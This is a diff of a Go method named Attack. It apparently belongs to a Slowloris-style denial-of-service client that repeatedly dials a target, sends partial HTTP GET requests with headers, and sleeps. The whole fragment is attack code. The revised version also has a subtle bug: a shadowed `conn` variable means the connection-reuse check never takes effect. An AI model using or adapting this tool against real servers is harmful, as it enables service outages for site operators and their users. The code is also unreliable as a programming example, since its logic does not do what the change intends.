@@ -69,29 +69,28 @@ func (c *Client) Attack(start *chan struct{}, target string) {
 	var conn net.Conn
 
 	for {
-		if conn != nil {
-			conn.Close()
-		}
 
 		switch {
 		case <-c.Stop:
 			break
 		default:
-			conn, err := c.Dialer.Dial("tcp", target)
-			if err != nil {
-				logging.Error(err.Error())
-				continue
-			}
-	
-			if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", "GET", "/"); err != nil {
-				logging.Error(err.Error())
-				continue
-			}
-	
-			header := createHeader(target)
-			if err = header.Write(conn); err != nil {
-				logging.Error(err.Error())
-				continue
+			if conn == nil {
+				conn, err := c.Dialer.Dial("tcp", target)
+				if err != nil {
+					logging.Error(err.Error())
+					continue
+				}
+		
+				if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", "GET", "/"); err != nil {
+					logging.Error(err.Error())
+					continue
+				}
+		
+				header := createHeader(target)
+				if err = header.Write(conn); err != nil {
+					logging.Error(err.Error())
+					continue
+				}
 			}
 	
 			time.Sleep(500)
